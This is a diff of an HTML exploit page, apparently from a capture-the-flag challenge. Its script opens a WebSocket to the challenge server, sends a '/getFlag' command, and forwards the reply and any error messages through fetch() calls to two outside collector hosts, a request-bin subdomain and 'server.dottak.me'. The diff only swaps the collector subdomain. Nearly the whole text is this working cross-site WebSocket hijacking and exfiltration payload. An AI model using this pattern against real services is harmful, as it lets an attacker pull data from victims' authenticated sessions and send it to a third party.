@@ -9,7 +9,7 @@
 
 <body>
   <script>
-    fetch('https://uwvmoap.request.dreamhack.games/?init=' + encodeURIComponent(e.message))
+    fetch('https://kpqfufz.request.dreamhack.games/?init=' + encodeURIComponent(e.message))
     fetch('http://server.dottak.me/?init=' + encodeURIComponent(e.message));
 
     const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
@@ -17,11 +17,11 @@
       ws.send(JSON.stringify({ message: '/getFlag' }));
     };
     ws.onmessage = (event) => {
-      fetch('https://uwvmoap.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
+      fetch('https://kpqfufz.request.dreamhack.games/?flag=' + encodeURIComponent(event.data));
       fetch('http://server.dottak.me/?flag=' + encodeURIComponent(event.data));
     };
     ws.onerror = (e) => {
-      fetch('https://uwvmoap.request.dreamhack.games/?error=' + encodeURIComponent(e.message))
+      fetch('https://kpqfufz.request.dreamhack.games/?error=' + encodeURIComponent(e.message))
       fetch('http://server.dottak.me/?error=' + encodeURIComponent(e.message));
     };
   </script>
